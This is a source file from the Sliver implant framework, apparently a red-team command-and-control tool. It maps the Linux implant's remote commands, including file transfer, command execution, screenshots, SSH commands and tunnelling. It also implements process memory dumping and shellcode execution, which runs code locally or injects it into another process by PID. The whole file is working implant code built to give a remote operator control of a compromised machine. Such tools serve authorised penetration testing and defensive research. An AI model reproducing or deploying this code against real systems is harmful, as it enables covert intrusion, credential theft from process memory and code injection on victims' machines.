package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/procdump"
	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

var (
	linuxHandlers = map[uint32]RPCHandler{
		sliverpb.MsgPsReq:        psHandler,
		sliverpb.MsgTerminateReq: terminateHandler,
		sliverpb.MsgPing:         pingHandler,
		sliverpb.MsgLsReq:        dirListHandler,
		sliverpb.MsgDownloadReq:  downloadHandler,
		sliverpb.MsgUploadReq:    uploadHandler,
		sliverpb.MsgCdReq:        cdHandler,
		sliverpb.MsgPwdReq:       pwdHandler,
		sliverpb.MsgRmReq:        rmHandler,
		sliverpb.MsgMkdirReq:     mkdirHandler,
		sliverpb.MsgMvReq:        mvHandler,
		sliverpb.MsgTaskReq:      taskHandler,
		sliverpb.MsgIfconfigReq:  ifconfigHandler,
		sliverpb.MsgExecuteReq:   executeHandler,
		sliverpb.MsgEnvReq:       getEnvHandler,
		sliverpb.MsgSetEnvReq:    setEnvHandler,
		sliverpb.MsgUnsetEnvReq:  unsetEnvHandler,

		sliverpb.MsgScreenshotReq: screenshotHandler,

		sliverpb.MsgNetstatReq:  netstatHandler,
		sliverpb.MsgSideloadReq: sideloadHandler,

		sliverpb.MsgReconfigureReq: reconfigureHandler,
		sliverpb.MsgSSHCommandReq:  runSSHCommandHandler,
		sliverpb.MsgProcessDumpReq: dumpHandler,

		// Wasm Extensions - Note that execution can be done via a tunnel handler
		sliverpb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,
		sliverpb.MsgDeregisterWasmExtensionReq: deregisterWasmExtensionHandler,
		sliverpb.MsgListWasmExtensionsReq:      listWasmExtensionsHandler,

		// {{if .Config.WGc2Enabled}}
		// Wireguard specific
		sliverpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
		sliverpb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
		sliverpb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
		sliverpb.MsgWGStartSocksReq:     wgStartSocksHandler,
		sliverpb.MsgWGStopSocksReq:      wgStopSocksHandler,
		sliverpb.MsgWGListSocksReq:      wgListSocksServersHandler,
		// {{end}}
	}
)

// GetSystemHandlers - Returns a map of the linux system handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return linuxHandlers
}

func dumpHandler(data []byte, resp RPCResponse) {
	procDumpReq := &sliverpb.ProcessDumpReq{}
	err := proto.Unmarshal(data, procDumpReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	res, err := procdump.DumpProcess(procDumpReq.Pid)
	dumpResp := &sliverpb.ProcessDump{Data: res.Data()}
	if err != nil {
		dumpResp.Response = &commonpb.Response{
			Err: fmt.Sprintf("%v", err),
		}
	}
	data, err = proto.Marshal(dumpResp)
	resp(data, err)
}

func taskHandler(data []byte, resp RPCResponse) {
	var err error
	task := &sliverpb.TaskReq{}
	err = proto.Unmarshal(data, task)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	if task.Pid == 0 {
		err = taskrunner.LocalTask(task.Data, task.RWXPages)
	} else {
		err = taskrunner.RemoteTask(int(task.Pid), task.Data, task.RWXPages)
	}
	resp([]byte{}, err)
}
